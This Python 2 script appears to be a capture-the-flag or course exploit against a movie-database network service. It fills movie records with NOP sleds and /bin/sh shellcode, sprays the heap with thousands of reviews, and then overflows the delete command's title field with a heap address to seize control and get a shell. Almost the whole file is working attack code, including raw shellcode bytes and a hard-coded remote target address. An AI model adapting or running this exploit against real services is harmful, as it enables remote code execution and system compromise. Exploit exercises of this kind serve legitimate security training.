#!/usr/bin/python

from sock import *
import sys
import time
import errno

###############################################################################
#
#   Skeleton exploit for use                                                  #
#   Uses a nice socket library (https://github.com/hellman/sock/)             #
#   Actually read this ans feel free to modify!                               #
#
###############################################################################

LOCAL = True

if LOCAL:
    HOST = "localhost"
    PORT = "55000"
    SLEEP_TIME = .04
else:
    HOST = "54.215.5.83"
    PORT = "3036"
    SLEEP_TIME = .1

NOP = "\x90"

HEAP_ADDRESS = "0x90000000"
#MAX_ENTRIES = 16384
MAX_ENTRIES = 2500


# Some useful shellcode (Not Aleph One's, but it does exec \bin\sh)
SHELLCODE = "\x6a\x0b\x58\x99\x52\x68\x2f\x2fsh\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

hacker = {"title":"Hackers",
          "director":"Iain Softley",
          "writer"  : "Rafael Moreu",
          "star1":"Jonny Lee Miller",
          "star2":"Angelina Jolie",
          "star3":"Jessie Bradford",
          "star4":"Matthew Lillard",
          "star5":"Laurence Mason",
          "summary":"A young boy is arrested by the US Secret Service for writing a computer virus and is banned from using a computer until his 18th birthday. Years later, he and his new-found friends discover a plot to unleash a dangerous computer virus, but they must use their computer skills to find the evidence while being pursued by the Secret Service and the evil computer genius behind the virus.",
          "country":"USA",
          "budget":"UNK",
          "opening_weekend":"UNK",
          "gross":"$7,564,000",
          "runtime":"107 min",
          "aspect":"2.35 : 1",
          "composer":"Someone",
          "average_rating":"5.0"}

################################################################################
#
#   pause_script
#
#   A useful function to wait for the user to press enter, that way you can 
#   put in pause points easily
#
################################################################################
def pause_script():
    raw_input("Paused... Press enter to continue: ")

################################################################################
#
#   pause_script_msg
#
#   A useful function to wait for the user to press enter, that way you can 
#   put in pause points easily, prints a custom message
#
################################################################################
def pause_script_msg(message):
    raw_input("Paused... " + message)

################################################################################
#
#   connect
#
################################################################################
def connect():
    con = Sock(HOST + ":" + PORT)
    return con

################################################################################
#
#   clear_read_buffer
#
#   This will clear the read buffer and print all of it
#
################################################################################
def clear_read_buffer(con):
    r = con.read_one(0)
    while len(r) > 0:
        print r
        r = con.read_one(0)

################################################################################
#
#   remove_movie
#
#   This will remove a movie, and tell you success
#
################################################################################
def remove_movie(title,con):
    # Choose the remove option from the main menu
    #con.send_line("d")
    con.send("d") 
    con.send("\n") 

    # Wait for a response
    time.sleep(1)

    # Clear out the read buffer
    con.read_one(0)
    
    # Send the movie title
    con.send_line(title)

    pause_script_msg("Press Enter to receive response")

    # Wait for a response
    time.sleep(1)

    # Read the response
    resp = con.read_line()

    # Did we delete the movie?
    return "Removed movie!" in resp

################################################################################
#
#   review_movie
#
#   This will review a movie
#
################################################################################
def review_movie(title, review, con):
    # Choose the remove option from the main menu
    con.send_line("r")
    
    # Wait for a response
    time.sleep(SLEEP_TIME)

    # Clear out the read buffer
    con.read_one(0)
    
    # Send the movie title
    con.send_line(title)

    # Wait for a response
    time.sleep(SLEEP_TIME)

    # Clear out the read buffer
    con.read_one(0)

    #pause_script_msg("Press Enter to send review")

    # Send the review
    con.send_line(review)

    # Wait for a response
    time.sleep(SLEEP_TIME)

    # Read the response
    resp = con.read_line()

    #print "Response received: " + resp
    # Did we delete the movie?
    return "Reviewed!" in resp

################################################################################
#
#   send_movie
#
#   This will add a movie
#
################################################################################
def send_movie(movie,con):
    # Choose the add option
    con.send_line("a")

    # Send all the data in order
    con.send_line(movie["title"])
    con.send_line(movie["director"])
    con.send_line(movie["writer"])
    con.send_line(movie["star1"])
    con.send_line(movie["star2"])
    con.send_line(movie["star3"])
    con.send_line(movie["star4"])
    con.send_line(movie["star5"])
    con.send_line(movie["summary"])
    con.send_line(movie["country"])
    con.send_line(movie["budget"])
    con.send_line(movie["opening_weekend"])
    con.send_line(movie["gross"])
    con.send_line(movie["runtime"])
    con.send_line(movie["aspect"])
    con.send_line(movie["composer"])
    con.send_line(movie["average_rating"])

################################################################################
#
#   go_interactive
#
#   Switches to an interactive mode, good for shells maybe
#   You can't get out of interactive mode
#
################################################################################
def go_interactive(con):
    while True:
        time.sleep(1)
        print con.read_one(0)
        con.write(sys.stdin.readline())

################################################################################
#
#   hijack_execution
#
################################################################################
def hijack_execution(con):

    # Setup overflow string
    overflow_string = ""
    #overflow_size = 512
    overflow_size = 528

    for i in range(0, overflow_size):
        overflow_string += "k"

    overflow_string += HEAP_ADDRESS

    # Choose the remove option from the main menu
    con.send_line("d")

    # Wait for a response
    time.sleep(SLEEP_TIME)

    # Clear out the read buffer
    con.read_one(0)

    #pause_script_msg("Press Enter to Pwn")
    
    # Send the "movie title"
    con.send_line(overflow_string)

    #go_interactive(con)
    #time.sleep(SLEEP_TIME)





################################################################################
#
#   build_nop_string
#
################################################################################
def build_nop_string(size):
    nop_string = ""

    for i in range(0, size):
        #if i == (size - 2):
        #    nop_string += "\xeb\x01"
        #    return nop_string
        #else:
        #    nop_string += NOP
        nop_string += NOP

    return nop_string

################################################################################
#
#   build_string
#
################################################################################
def build_string(string, size):
    built_string = ""

    for i in range(0, size):
        built_string += string

    return built_string

################################################################################
#
#   build_movie
#
################################################################################
def build_movie():

    title           = build_nop_string(500)
    director        = build_nop_string(300)
    writer          = build_nop_string(300)
    star1           = build_nop_string(300)
    star2           = build_nop_string(300)
    star3           = build_nop_string(300)
    star4           = build_nop_string(300)
    star5           = build_nop_string(300)
    summary         = build_nop_string(2000)
    country         = build_nop_string(30)
    budget          = build_nop_string(80)
    opening_weekend = build_nop_string(80)
    gross           = build_nop_string(80)
    runtime         = build_nop_string(80)
    aspect          = build_nop_string(40)
    composer        = build_nop_string(279)

    composer += SHELLCODE

    average_rating = build_nop_string(3)

    movie = {           
              "title" : title,
           "director" : director,
             "writer" : writer,
              "star1" : star1,
              "star2" : star2,
              "star3" : star3,
              "star4" : star4,
              "star5" : star5,
            "summary" : summary,
            "country" : country,
             "budget" : budget,
    "opening_weekend" : opening_weekend,
              "gross" : gross,
            "runtime" : runtime,
             "aspect" : aspect,
           "composer" : composer,
     "average_rating" : average_rating
    }

    return movie

################################################################################
#
#   undo_xor
#
################################################################################
def undo_xor(field, field_len, xor_key, xor_key_len):

    if (field_len % xor_key_len != 0):
        print "undo_xor error"
        return

    for keyItr in range (0,  field_len / xor_key_len):
        base = keyItr * xor_key_len;
        for index in range (0, xor_key_len):
            field[base + index] = field[base+index] ^ xor_key[index]
    return field


################################################################################
#
#   undo_permute
#
################################################################################
def undo_permute(field, fieldLen, perm, permLen):

    tmp = [0 for i in range(permLen)]

    if(fieldLen % permLen != 0):
        print "undo_permute error"
        return
    for permItr in range( 0,fieldLen / permLen):
        base = permItr * permLen

        #copy into tmp
        for index in range(0,permLen):
            tmp[perm[index]] = field[index]

        #copy back into field
        for index2 in range(0,permLen):
            field[base+index2] = tmp[index2]
    return field



################################################################################
#
#   Main
#
################################################################################

# Start the connection
con = connect()

#pause_script_msg("Press Enter to start exploit")

movie = build_movie()

send_movie(movie, con)

print "Movie sent"
#pause_script_msg("Press Enter to start reviews")

#go_interactive(con)

# Create reviews to amplify the spray

title  = NOP + "\0"
review = build_nop_string(3)

for i in range(0, MAX_ENTRIES):
    if review_movie(title, review, con):
        print `i` + ": Review Successful!"
    else:
        print `i` + ": Review Failed!"

hijack_execution(con)




################################################################################
#
#   Spare Code
#
################################################################################



#send_movie(hacker,con)
#if remove_movie("Hackers",con):
#if remove_movie(build_nop_string(500),con):
#    print "Deleted!"
#else:
#    print "Didn't delete :("



#exit(0)
#send_movie(hacker, con)

